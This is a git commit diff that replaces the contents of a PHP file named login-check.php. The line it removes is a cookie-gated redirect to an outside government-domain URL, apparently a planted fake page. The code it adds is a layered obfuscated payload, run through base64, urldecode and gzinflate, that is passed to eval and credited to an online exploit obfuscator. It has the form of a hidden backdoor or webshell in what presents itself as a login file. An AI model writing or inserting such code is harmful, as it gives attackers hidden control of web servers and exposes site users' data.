ea81d588c259ac532ed318be2d79e943e52c43e6
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-08-19 04:29:22 +0700

    Update login-check.php

--- login-check.php
+++ login-check.php
@@ -1,1 +1,12 @@
-<?php if((int)$_COOKIE["alfa_fakepage_counter16973"]<3){@header("Location: http://sipenak.pn-tanjungkarang.go.id/well-known/?:2083");exit;}?>
+<?php
+
+//Encode by : Unknown45
+//Obfuscated by : Unknown45
+//Level : Strong
+//Tool Online : https://exploits.my.id
+
+$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "nQ0hxY+LZsTA+7znLb5PSIuJDtutuQZh5zBTxFsa2RN+UnZAwE3k1gOGKZwlCAUb9qEF5EooqoH2WsPukypOQoxe4LLrxPz7Xa20MyU/pBLYMgTP00DjEwTv2p/6cWNeirlU2jMhwk+VfvXvQI2ONwpmn7xgQi4BALqLI2yDlLUVQzbxRH5VgDAFwIoCdHcBci3/xBgjBwJe/bGAZGw/hBgnB8PXAMaA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
+?>
